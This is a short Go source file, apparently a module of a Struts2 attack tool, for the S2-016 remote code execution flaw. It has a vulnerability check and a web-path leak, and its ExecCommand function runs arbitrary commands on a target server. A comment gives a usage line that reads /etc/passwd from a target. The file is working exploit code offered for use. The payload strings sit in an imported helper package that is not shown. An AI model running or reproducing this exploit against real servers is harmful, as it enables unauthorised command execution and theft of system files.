package s016

import (
	"ST2G/cvemod/utils"
	"fmt"
	"github.com/fatih/color"
	"log"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-016/default.action --vn 16 --mode exec --cmd "cat /etc/passwd"
*/

func Check(targetUrl string) {
	//s016的目的url必须带action，比如：http://xxx.com/xxx.action
	//respString := utils.GetFunc4Struts2(targetUrl,"",utils.PocS016Check)
	headerLocation := utils.Get302Location(targetUrl + utils.PocS016Check)
	//fmt.Println(headerLocation)
	if utils.IfContainsStr(headerLocation, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-016！"))
	} else {
		log.Printf("%s Struts2-016 Not Vulnerable.", utils.Green(targetUrl))
	}
}

func GetWebPath(targetUrl string) {
	webPath := utils.GetFunc4Struts2(targetUrl, "", utils.PocS016WebPath)
	color.Green(webPath)
}

func ExecCommand(targetUrl string, command string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS016Exec(command))
	fmt.Println(respString)
}
